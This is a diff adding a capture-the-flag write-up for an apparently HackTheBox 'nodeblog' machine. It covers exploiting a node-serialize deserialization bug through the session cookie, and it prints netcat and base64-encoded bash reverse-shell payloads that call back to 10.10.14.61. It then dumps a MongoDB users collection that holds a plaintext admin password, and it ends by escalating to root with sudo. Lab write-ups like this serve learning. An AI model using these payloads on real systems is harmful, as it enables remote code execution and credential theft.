@@ -227,19 +227,181 @@ Save this in a file "bankai.xml" and try to upload
 
 nice nice, we can read the ```server.js``` file
 
+### Exploiting Node-Serialization
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8c577984-7dd5-4d32-960f-a32d4d51567c)
+
+"Node-serialize" typically refers to a vulnerability or security risk related to the use of the ```serialization```
+
+Capture the request of the webpage again using burpsuite and take a look at the cookie that is being used
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/79e0ad2d-72d2-4bba-9c44-75bdc89801a2)
+
+Url Decoding the cookie gives us this
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/64787708-c706-47b4-979e-b3cb1790c7c7)
+
+```{"user":{"$gt":""},"sign":"4b7029c2a4ed7527255315fc356bf082"}``` this is the cookie that is being url encoded
+
+This [blog](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) actually helped in understanding how to exploit this.
+
+We'll be using the payload used in the blog
+
+```
+{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',
+function(error, stdout, stderr) { console.log(stdout) });\n }()"}
+```
+So, we can cook our own payload to be this
+
+```
+{"user":{"$gt":""},"sign":"4b7029c2a4ed7527255315fc356bf082","BlackAnon":"_$$ND_FUNC$$_function (){require(\"child_process\").exec(\"nc 10.10.14.61 4444\", function(error, stdout, stderr) { console.log(stdout) });}()"}
+```
+So what this will do is send a connection to port ```4444```, we'll set up our netcat listener to listen for incoming connections
+
+Now, url encode that and replace it with the previous cookie
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a87a7c88-ecb7-4be3-ac19-49a3e92c5e3b)
+
+After sending the request check your netcat listener,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/062cccb0-5f38-431f-8f3e-ec48b617189e)
+
+cool, we got a connection.
+
+Now, instead of sending a connection lets spawn a reverse shell
+
+We'll encode our reverse shell in base64,
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/nodeblog]
+└─$ echo -n "bash -i  >& /dev/tcp/10.10.14.61/1234 0>&1" | base64 
+YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvMTIzNCAwPiYx
+```
+To decode this base64
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/nodeblog]
+└─$ echo -n "YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvMTIzNCAwPiYx" | base64 -d
+bash -i  >& /dev/tcp/10.10.14.61/1234 0>&1
+```
+To execute this reverse shell we'll use a pipe (|) to send the output of the echo command as input to the bash shell.
+
+Our final payload looks like this
+
+```
+{"user":{"$gt":""},"sign":"4b7029c2a4ed7527255315fc356bf082","BlackAnon":"_$$ND_FUNC$$_function (){require(\"child_process\").exec(\"echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvMTIzNCAwPiYx | base64 -d | bash\", function(error, stdout, stderr) { console.log(stdout) });}()"}
+```
+We'll url encode this, then replace it with the previous cookie. Also, ensure you set up your netcat listener
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f9ee22f6-7f16-44cf-9ecc-c2a590e9313d)
+
+Checking the netcat listener we set up
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0a126538-e559-4b46-9b70-ea73cb96abfe)
+
+we spawned a shell hehehe.
+
+To stabilize the shell
+
+```
+python3 -c “import pty;pty.spawn(‘/bin/bash’)”
+ctrl + z (to background)
+stty raw -echo && fg
+export TERM=xterm
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cf850ff6-4021-4e30-9019-dc267ea9bb3f)
+
+Lets try to read the user flag
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/54988db0-6ea1-4c6b-83c1-03d7d7759532)
+
+Permission Denied ke😂. Well, since we spwned a shell as user ```admin``` and it's user admin that owns that directory, we can actually change the permissions
+
+command:```chmod +x admin/```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/86b471cd-4eed-4ce4-9b3e-a8dda44c52b0)
+
+Lets escalate our privileges
 
 
 
 
+# Privilege Escalation
+
+Running the command ```netstat -tulnp```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/21cd0f8c-fb79-45d8-a9f5-9d52f493955f)
+
+We can see MongoDB listening on port 27017.
+
+To connect to the mongodb just run the command ```mongo```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1fee329a-e3dc-4eec-b82f-b373d776fb3e)
+
+To show databases;
+
+command:``` show dbs```
+
+```
+> show dbs
+admin   0.000GB
+blog    0.000GB
+config  0.000GB
+local   0.000GB
+```
+To connect to a database;
+
+command:```use blog```
+
+```
+> use blog
+switched to db blog
+```
+To list the contents of the database;
+
+command:```show collections```
+
+```
+> show collections
+articles
+users
+```
+To dump the content of all the documents within the collection named users;
+
+command:```db.users.find().pretty()```
+
+```
+> db.users.find().pretty()
+{
+        "_id" : ObjectId("61b7380ae5814df6030d2373"),
+        "createdAt" : ISODate("2021-12-13T12:09:46.009Z"),
+        "username" : "admin",
+        "password" : "IppsecSaysPleaseSubscribe",
+        "__v" : 0
+}
+```
+We got the password for the admin user 
+
+Now, lets run the ```sudo -l``` command since we've gotten the user's password
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b0f4bbfc-5c3c-496c-8936-b77f9c9fb4f9)
+
+So, we can run all the commands with root permissions
+
+To spawn a root shell, lets run the command ```sudo su```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/edaed0c0-9a29-49e8-bdba-e40e16fbb7d1)
+
+We got root shell😎
 
 
+I learmt new stuffs from this box actually.
 
 
-
-
-
-
-
+That will be all for today
+<br><br>
+[Back To Home](../../index.md)
 
 
 
